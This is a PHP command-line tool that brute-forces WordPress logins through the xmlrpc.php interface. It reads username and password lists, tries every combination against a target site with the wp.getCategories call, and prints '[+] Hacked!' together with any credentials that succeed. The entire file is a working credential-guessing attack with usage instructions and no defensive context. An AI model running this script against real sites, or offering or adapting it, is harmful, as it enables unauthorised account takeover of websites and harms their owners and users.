#!/usr/bin/php
<?php
error_reporting(E_ALL);
require("class-IXR.php");

class XMLRPC_WP {
	function __construct($site, $users_file, $passwords_file) {
		/*Set initial variables..  */
		$this->site = $site;
		$this->users_file = null;
		$this->passwords_file = null;
		#Read a username and password files
		$this->create_lists($users_file, $passwords_file);
	}
	function create_lists($users_file, $passwords_file) {
		if(!file_exists($users_file)) {
			echo("[-] User list doesn't exists!\r\n");
			exit(0);	
		} else if(!file_exists($passwords_file)) {
			echo("[-] Password list doesn't exists!\r\n");
			exit(0);
		} else {
			$this->users_file = file($users_file);
			$this->passwords_file = file($passwords_file);
		}
	}

	function login($username, $password) {
		$client = new IXR_Client($this->site . '/xmlrpc.php');
		if (!$client->query('wp.getCategories','', $username,$password)) {  
            echo "\033[31m" . trim($username) . " : " . trim($password) . "  - Not Working\n";
            return False;
		}
		return True;
	}

	function bruteforce() {
		echo("[~] Running..\r\n");
		$flag = False;
		foreach($this->users_file as $user) {
			foreach($this->passwords_file as $password) {
				if($this->login($user, $password) == True) {
					$flag = True;
					echo("[+] Hacked!\r\nUsername: " . $user . "\r\nPassword: " . $password . "\r\n");
					echo("[~] Done!\r\n");		
				}
			}
		}
		if(!$flag) {
			echo("[-] Login credentials not found.\r\n");
		}
	}
}

if(!empty($argv[1]) && !empty($argv[2]) && !empty($argv[3])) {
	if(empty(parse_url($argv[1])['scheme'])) {
		echo("[-] URL Invalid!\r\nExample URL: http(s)://example.com\r\n");
		exit(0);		
	}
	$rpcbruteforce = new XMLRPC_WP($argv[1], $argv[2], $argv[3]);
	$rpcbruteforce->bruteforce();
} else {
	echo("[~] USAGE: ". $argv[0]. " http://www.example.com/wp/ usernames.txt passwords.txt\r\n");
}

?>
